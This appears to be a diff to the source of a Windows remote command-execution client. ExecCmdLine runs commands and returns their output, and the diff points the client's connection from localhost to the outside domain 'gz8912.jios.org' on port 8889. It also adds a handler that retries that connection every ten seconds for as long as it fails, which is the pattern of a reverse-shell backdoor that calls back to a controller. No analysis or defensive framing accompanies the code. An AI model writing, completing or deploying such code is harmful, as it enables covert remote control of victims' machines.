@@ -160,6 +160,7 @@ VOID ExecCmdLine( LPCWSTR pszCmdLine ,TypeMsgOutputCallBack pCallback,PVOID pPar
 			}
 			else
 			{
+				nTimeOutCount = 0;
 				pStdInfo->chOutputBuffer[pStdInfo->dwReadLen] = 0;
 
 				/////////////////
@@ -395,7 +396,33 @@ VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen 
 }
 VOID WINAPI ConnectClosed( HANDLE hClient )
 {
-	int a=0;
+	DeleteClient(hClient);
+
+	while (TRUE)
+	{
+		hClient = CreateClient(DataRecvCallback,ConnectClosed);
+		BOOL bConRes = ClientConnect(hClient,"gz8912.jios.org",8889);
+
+		if (bConRes)
+		{
+			StartRecvData(hClient);
+			break;
+		}
+		else
+		{
+			DeleteClient(hClient);
+		}
+
+		Sleep(10000);
+	}
+
+
+}
+
+
+VOID WINAPI TestMsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
+{
+	OutputDebugStringA(pszOutputMsg);
 }
 
 int APIENTRY _tWinMain(HINSTANCE hInstance,
@@ -404,8 +431,12 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
                      int       nCmdShow)
 {
 
+// 	{
+// 		ExecCmdLine(L"tasklist /M",TestMsgOutputCallBack,NULL);
+// 		return 0;
+// 	}
 	HANDLE hClient = CreateClient(DataRecvCallback,ConnectClosed);
-	BOOL bConRes = ClientConnect(hClient,"localhost",8889);
+	BOOL bConRes = ClientConnect(hClient,"gz8912.jios.org",8889);
 	
 	if (bConRes)
 	{
